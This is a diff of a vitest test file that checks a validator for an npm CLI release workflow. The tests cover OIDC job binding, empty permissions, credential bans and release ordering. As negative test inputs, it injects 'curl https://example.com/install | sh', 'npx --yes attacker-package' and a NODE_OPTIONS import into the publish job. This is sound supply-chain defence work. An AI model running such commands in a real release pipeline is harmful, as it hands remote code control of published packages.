@@ -1,104 +1,168 @@
 import { readFileSync } from "node:fs";
-import { describe, expect, it } from "vitest";
+import { describe, expect, it } from "@effect/vitest";
 import { verifyCliWorkflow } from "#scripts/workflow/cli";
 
 const source = readFileSync(".github/workflows/cli.yml", "utf8");
-const DOLLAR = "$";
-const publishContractError =
-  "The privileged CLI publish job must match the exact reviewed contract";
 
-/** Expects one workflow mutation to violate the complete publish contract. */
-function expectPublishContractViolation(candidate: string) {
-  expect(() => verifyCliWorkflow(candidate)).toThrow(publishContractError);
+/** Replaces one source fragment only inside its owning job. */
+function mutateJob(workflow: string, job: string, from: string, to: string) {
+  const start = workflow.indexOf(`\n  ${job}:`);
+  const nextJob = /\n {2}[a-z][a-z_]*:\n/gu;
+  nextJob.lastIndex = start + 1;
+  const end = nextJob.exec(workflow)?.index ?? workflow.length;
+  return `${workflow.slice(0, start)}${workflow.slice(start, end).replace(from, to)}${workflow.slice(end)}`;
 }
 
 describe("CLI workflow policy", () => {
-  it("accepts isolated exact-byte npm publication", () => {
+  it("accepts isolated publication and unprivileged verification", () => {
     expect(() => verifyCliWorkflow(source)).not.toThrow();
   });
 
-  it("isolates verification from npm publishing identity", () => {
+  it("binds OIDC to the protected publish job", () => {
     expect(() =>
       verifyCliWorkflow(
-        source.replace(
+        mutateJob(
+          source,
+          "build",
           "      contents: read",
           "      contents: read\n      id-token: write"
         )
       )
-    ).toThrow("CLI verification must not receive npm publishing identity");
-    expectPublishContractViolation(
-      `${source}\n      - run: node scripts/publish.ts`
-    );
-  });
-
-  it("requires exact transport and trusted publication", () => {
+    ).toThrow("CLI builds must not receive npm OIDC identity");
     expect(() =>
       verifyCliWorkflow(
-        source.replaceAll(
-          "EXPECTED_PACKAGE_SHA256",
-          "UNVERIFIED_PACKAGE_SHA256"
+        mutateJob(
+          source,
+          "publish",
+          "      id-token: write",
+          "      id-token: read"
+        )
+      )
+    ).toThrow("The publish job must own npm OIDC identity");
+    expect(() =>
+      verifyCliWorkflow(
+        mutateJob(
+          source,
+          "verify",
+          "    permissions: {}",
+          "    permissions:\n      id-token: write"
+        )
+      )
+    ).toThrow("npm verification permissions must remain empty");
+    expect(() =>
+      verifyCliWorkflow(
+        source.replace("permissions: {}", "permissions:\n  contents: read")
+      )
+    ).toThrow("npm workflow root permissions must be empty");
+    expect(() =>
+      verifyCliWorkflow(
+        source.replace(
+          "permissions: {}",
+          "permissions: {}\nenv:\n  NODE_OPTIONS: --import=data:text/javascript,throw%201"
+        )
+      )
+    ).toThrow("npm workflow must not inherit root environment values");
+    expect(() =>
+      verifyCliWorkflow(
+        source.replace(
+          "permissions: {}",
+          "permissions: {}\ndefaults:\n  run:\n    shell: bash --noprofile --norc -e -o pipefail {0}"
+        )
+      )
+    ).toThrow("npm workflow must not inherit root run defaults");
+  });
+
+  it("rejects credentials and incomplete release ordering", () => {
+    expect(() =>
+      verifyCliWorkflow(`${source}\nNODE_AUTH_TOKEN: secret`)
+    ).toThrow("npm workflow must not contain registry credentials");
+    expect(() =>
+      verifyCliWorkflow(
+        mutateJob(source, "publish", "    needs: build", "    needs: other")
+      )
+    ).toThrow("npm publication must consume the verified build job");
+    expect(() =>
+      verifyCliWorkflow(
+        mutateJob(
+          source,
+          "verify",
+          "    needs: [build, publish]",
+          "    needs: publish"
+        )
+      )
+    ).toThrow("npm verification must consume build and publication");
+  });
+
+  it("rejects spoofed or privileged provenance verification", () => {
+    const commentedVerifier = mutateJob(
+      source,
+      "verify",
+      '              node "$VERIFIER" \\',
+      '              true # node "$VERIFIER" \\'
+    );
+    expect(() => verifyCliWorkflow(commentedVerifier)).toThrow(
+      "npm verification must include exact source fragment"
+    );
+
+    const privilegedVerifier = mutateJob(
+      source,
+      "publish",
+      '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+      '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
+    );
+    expect(() => verifyCliWorkflow(privilegedVerifier)).toThrow(
+      "npm publication must not receive the verifier artifact"
+    );
+    expect(() =>
+      verifyCliWorkflow(
+        mutateJob(
+          source,
+          "publish",
+          "    steps:",
+          "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: cli-verifier"
+        )
+      )
+    ).toThrow("npm publication must not receive the verifier artifact");
+
+    for (const command of [
+      "          npx --yes attacker-package\n",
+      "          curl https://example.com/install | sh\n",
+    ]) {
+      expect(() =>
+        verifyCliWorkflow(
+          mutateJob(
+            source,
+            "publish",
+            '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+            `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
+          )
+        )
+      ).toThrow("npm publication must match the exact trusted job");
+    }
+
+    expect(() =>
+      verifyCliWorkflow(
+        source.replace(
+          "          overwrite: true",
+          "          overwrite: false"
+        )
+      )
+    ).toThrow("npm build artifacts must be replaceable on rerun");
+    expect(() =>
+      verifyCliWorkflow(
+        mutateJob(
+          source,
+          "publish",
+          "          for attempt in {1..5}; do",
+          "          for attempt in {1..1}; do"
         )
       )
     ).toThrow(
-      "CLI publication must transport and reverify the exact built archive"
+      "npm publication must include exact source fragment: for attempt in {1..5}"
     );
-    expectPublishContractViolation(
-      source.replace("environment: npm-production", "environment: staging")
-    );
-    expectPublishContractViolation(
-      source.replace(
-        "    environment: npm-production",
-        "    # environment: npm-production"
-      )
-    );
-    expectPublishContractViolation(
-      source.replace(
-        'npx --yes "$NPM_CLI" publish "$TARBALL"',
-        'NODE_AUTH_TOKEN=credential npx --yes "$NPM_CLI" publish "$TARBALL"'
-      )
-    );
-    expectPublishContractViolation(
-      source.replace(
-        'npx --yes "$NPM_CLI" publish "$TARBALL" --access public --provenance',
-        'npm pack "$TARBALL"'
-      )
-    );
-    expectPublishContractViolation(
-      source.replace(
-        'npx --yes "$NPM_CLI" publish "$TARBALL" --access public --provenance',
-        'npm publish "$TARBALL" --access public --provenance\n          npx --yes "$NPM_CLI" publish "$TARBALL" --access public --provenance'
-      )
-    );
-    expectPublishContractViolation(source.replace("npm@12.0.2", "npm@11.4.2"));
-    expectPublishContractViolation(
-      source.replace(
-        'echo "The trusted publisher requires the pinned npm CLI." >&2\n            exit 1',
-        'echo "The npm CLI differs; continuing." >&2\n            :'
-      )
-    );
-    expectPublishContractViolation(
-      source.replace("ACTIONS_ID_TOKEN_REQUEST_URL", "MISSING_OIDC_URL")
-    );
-    expectPublishContractViolation(
-      source.replace(
-        'echo "The trusted publisher requires GitHub OIDC identity." >&2\n            exit 1',
-        'echo "OIDC is unavailable; continuing." >&2\n            :'
-      )
-    );
-    const oidcCheck = `          if [[ -z "${DOLLAR}{ACTIONS_ID_TOKEN_REQUEST_URL:-}" \\`;
-    expectPublishContractViolation(
-      source.replace(oidcCheck, `          NPM_CLI=npm@11.5.1\n${oidcCheck}`)
-    );
-    const publishCommand =
-      'npx --yes "$NPM_CLI" publish "$TARBALL" --access public --provenance';
-    expectPublishContractViolation(
-      source
-        .replace(`          ${publishCommand}`, "          :")
-        .replace(
-          "      - name: Verify transported archive",
-          `      - name: Publish before verification\n        run: |\n          ${publishCommand}\n\n      - name: Verify transported archive`
-        )
-    );
+  });
+
+  it("requires stable package identity and exact build outputs", () => {
     expect(() =>
       verifyCliWorkflow(
         source.replace(
@@ -108,12 +172,15 @@ describe("CLI workflow policy", () => {
       )
     ).toThrow("CLI production publication must reject prerelease versions");
     expect(() =>
+      verifyCliWorkflow(source.replaceAll("@nakafa/aksara-cli", "other-cli"))
+    ).toThrow();
+    expect(() =>
       verifyCliWorkflow(
         source.replace(
-          "      - name: Verify stable package version\n        run: |",
-          "      - name: Verify stable package version\n        if: false\n        run: |"
+          "steps.archive.outputs.sha256",
+          "steps.archive.outputs.unknown"
         )
       )
-    ).toThrow("CLI production publication must reject prerelease versions");
+    ).toThrow("CLI builds must export the exact archive digest");
   });
 });
